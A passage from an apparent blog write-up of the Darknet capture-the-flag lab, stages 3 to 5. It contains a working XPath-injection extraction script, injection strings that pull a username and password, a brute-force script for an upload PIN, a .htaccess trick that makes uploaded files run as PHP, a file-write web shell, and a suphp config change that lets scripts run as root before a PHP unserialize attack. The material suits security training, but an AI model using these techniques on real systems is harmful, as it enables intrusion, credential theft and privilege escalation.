&lt;span style=&#34;color: #f8f8f2&#34;&gt;cmp_pos&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;carry_on&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;True&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;carry_on:&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;carry_on&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;name&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ascii_letters:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;payload_tpl&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(path,cmp_pos,c)}&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;get(URL,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;params&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload)&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;text&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;find(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;errorlevel&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;carry_on&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;True&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;cmp_pos&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Path name:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;name&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I ran this with the current path&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/darknet# python xpath.py 
u
us
use
user
Path name: user
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;and the parent path&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/darknet# python xpath.py ..
a
au
aut
auth
Path name: auth
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Ok, that will help me get some more data from the file. I try to see if the
email field will work with &lt;code&gt;1]/email|auth[id=1&lt;/code&gt;. I need the &lt;code&gt;auth&lt;/code&gt; part because
without it the query will not close correctly in the main script, and this
makes sure the closing &lt;code&gt;]&lt;/code&gt; won&amp;rsquo;t error.&lt;/p&gt;

&lt;p&gt;So now I should be able to get the username with &lt;code&gt;1]/username|auth[id=1&lt;/code&gt;.
Now let&amp;rsquo;s try the password field. I tried &lt;code&gt;pass&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; before I realised we&amp;rsquo;re dealing with another
language here. Thanks to the logins I know that the spanish for password is &lt;em&gt;clave&lt;/em&gt;.
&lt;code&gt;id=1]/clave|auth[id=1&lt;/code&gt; throws up the password! Result. Using these detail
I am able to login at &lt;code&gt;signal8.darknet.com/xpanel&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-4:3817275722f75303351ad52bb23d8c3d&#34;&gt;Stage 4&lt;/h1&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/TVG7WhQ.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Oooh a PHP editor! Sweet&amp;hellip; yeah right. Clicking the link goes to a page that shows:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Tr0ll Found

The requested URL /xpath/xpanel/edit.php was not found on this server.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So after some manual digging nothing comes up. Time to break out &lt;code&gt;dirbuster&lt;/code&gt; again
to find &lt;code&gt;ploy.php&lt;/code&gt; which presents me with&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/DueLt5z.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;It requires a file which it uploads, as well as a specific combination of checkboxes to be checked.
Just trying some random checkboxes I can determine that the correct number of boxes is 4,
but instead of trying this all manually, I&amp;rsquo;ll script this part.
Looking at the source of the page I see the values for the checkboxes.
All I have to do is iterate of all possible combinations of 4 of these numbers.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s my bruteforce script:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;itertools&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;devnull&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;passwd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;j4tC1P9aqmY&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;base_url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;http://signal8.darknet.com/xpanel/&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;login_url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base_url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;user,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;passwd}&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;sess&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;session()&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sess&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;post(login_url,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload)&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;ploy_url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base_url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;ploy.php&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;attempt&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;itertools&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;permutations([&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;37&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;58&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;22&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;72&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;10&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;59&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;17&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;99&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Action&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Upload&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
               &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;checkbox[]&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;attempt&lt;/span&gt;

              &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;files&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;imag&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;info.txt&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;info.php&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)}&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sess&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;post(ploy_url,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;files&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;files)&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;text&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;find(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Key incorrecta!&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Found pin: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;attempt&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The correct PIN is &lt;code&gt;&#39;37&#39;, &#39;10&#39;, &#39;59&#39;, &#39;17&#39;&lt;/code&gt;. I tried to upload a PHP script, but
that won&amp;rsquo;t work. Seems uploading anything with a &lt;code&gt;php&lt;/code&gt; extension is forbidden.
Casting my mind back I noticed that in the apache config I noticed something interesting.
For this site &lt;code&gt;AllowOverride All&lt;/code&gt; is on. Most likely going to be something to
do with &lt;code&gt;.htaccess&lt;/code&gt;. To check this I upload the following file, and then browse to a
non-existant file, to generate a 404&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Order deny,allow
Allow from all
ErrorDocument 404 https://google.com
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;This should direct me to &lt;code&gt;google.com&lt;/code&gt;, which it does, indicating &lt;code&gt;.htaccess&lt;/code&gt; overrides work here.
So what can I do from here that will either allow me to upload a PHP shell or do something else?&lt;/p&gt;

&lt;p&gt;Unfortunately there&amp;rsquo;s another issue: as I upload files, old files seem to get deleted.
I found this out when the 404 redirect stopped working after uploading an html file.&lt;/p&gt;

&lt;p&gt;Luckily I discovered that it&amp;rsquo;s possible to execute php code inside the .htaccess file.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;AddHandler application/x-httpd-php .htaccess                                    
DirectoryIndex .htaccess                                                        
&amp;lt;FilesMatch &amp;quot;^\.htaccess&amp;quot;&amp;gt;                                                      
Order deny,allow                                                                
Allow from all                                                                  
SetHandler application/x-httpd-php                                              
&amp;lt;/FilesMatch&amp;gt;                                                                   
                                                                                
#&amp;lt;?php print $_GET[&amp;quot;test&amp;quot;]; ?&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Sure enough the &lt;code&gt;$_GET[&amp;quot;test&amp;quot;]&lt;/code&gt; variable is on the page. So this should allow me
to get a run some useful code on there somehow.&lt;/p&gt;

&lt;p&gt;After following some blind leads, I wrote a php script that would take a file encoded
with base64 and a filename via a &lt;code&gt;POST&lt;/code&gt; method and write this file out.
(Note: appending the entire script for DAws or similar didn&amp;rsquo;t work).
Something like this should work though:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$fp = fopen($_POST[&amp;#39;name&amp;#39;], &amp;#39;wb&amp;#39;); 
fwrite($fp, base64_decode($_POST[&amp;#39;data&amp;#39;])); 
fclose($fp);
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;At the end of the &lt;code&gt;.htaccess&lt;/code&gt; file. However this always error with a permissions
error.&lt;/p&gt;

&lt;p&gt;After struggling with this for quite some time I got some help from a fellow
#vulnhub resident who helped me out with something I missed. It&amp;rsquo;s &lt;code&gt;suphp&lt;/code&gt; not &lt;code&gt;php&lt;/code&gt;,
so I wasn&amp;rsquo;t executing the script as the &lt;code&gt;errorlevel&lt;/code&gt; user. Derp.&lt;/p&gt;

&lt;p&gt;More info on &lt;a href=&#34;http://suphp.org/Home.html&#34;&gt;suphp&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-5:3817275722f75303351ad52bb23d8c3d&#34;&gt;Stage 5&lt;/h1&gt;

&lt;p&gt;So having sorted that I uploaded &lt;code&gt;DAws&lt;/code&gt; and got myself a reverse shell and explored
once more. Now inside &lt;code&gt;/var/www&lt;/code&gt; there&amp;rsquo;s some files I missed earlier: &lt;code&gt;sec.php&lt;/code&gt;,
&lt;code&gt;Classes/Test.php&lt;/code&gt;, and &lt;code&gt;Classes/Show.php&lt;/code&gt;. Interesting.&lt;/p&gt;

&lt;p&gt;Trying to hit &lt;code&gt;darknet.com/sec.php&lt;/code&gt; errors. Let&amp;rsquo;s take a look inside of it&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Classes/Test.php&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Classes/Show.php&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;empty&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;($_POST[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;])){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$_POST[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;$j&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;unserialize($d);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$j;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Rembering that we&amp;rsquo;re dealing with suphp it could well be that the 500 error is
because &lt;code&gt;sec.php&lt;/code&gt; is trying to run as &lt;code&gt;root&lt;/code&gt;. Checking &lt;code&gt;/etc/suphp/suphp.conf&lt;/code&gt;
my suspicion is correct, the &lt;code&gt;min_uid&lt;/code&gt; and &lt;code&gt;min_gid&lt;/code&gt; settings are too high for
&lt;code&gt;root&lt;/code&gt; scripts to run. But hey, as luck would have it (thanks q3rv0) &lt;code&gt;suphp.conf&lt;/code&gt;
is &lt;code&gt;777&lt;/code&gt;. So heading straight to &lt;code&gt;sed&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ sed -i &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;s/min_uid=100/min_uid=0/g&amp;#39;&lt;/span&gt; suphp.conf
sed: couldn&amp;#39;t open temporary file ./sedm2LUZQ: Permission denied
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Hmph. Ok then I&amp;rsquo;ll copy the &lt;code&gt;suphp.conf&lt;/code&gt; to &lt;code&gt;/tmp&lt;/code&gt; and edit it there, then copy
it back. Making sure I change both &lt;code&gt;min_uid&lt;/code&gt; and &lt;code&gt;min_gid&lt;/code&gt;, I reload &lt;code&gt;sec.php&lt;/code&gt; and
get a blank page. No errors are good errors.&lt;/p&gt;

&lt;p&gt;Now that I&amp;rsquo;ve got &lt;code&gt;sec.php&lt;/code&gt; running I can go ahead and see what we might be able to exploit.
Anything we do with this file will run as root, some hopefully this is the last part of
Darknet, because I want my life back :)&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sec.php&lt;/code&gt; unserialises our input, which basically takes a serialised string
and &lt;a href=&#34;https://php.net/manual/en/function.unserialize.php&#34;&gt;unserialises into an object&lt;/a&gt;.
Similar to Python&amp;rsquo;s pickle. There&amp;rsquo;s no way I can call a method on either of the classes,
so I have to see what will get called for me.
The &lt;code&gt;Test&lt;/code&gt; class has a rather useful destructor, which,
will write data to disk and make it world readable. Almost as if that&amp;rsquo;s what
we&amp;rsquo;re supposed to use.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;Test&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$url;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$name_file;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$path;&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;__destruct&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;$data&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;file_get_contents($this&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
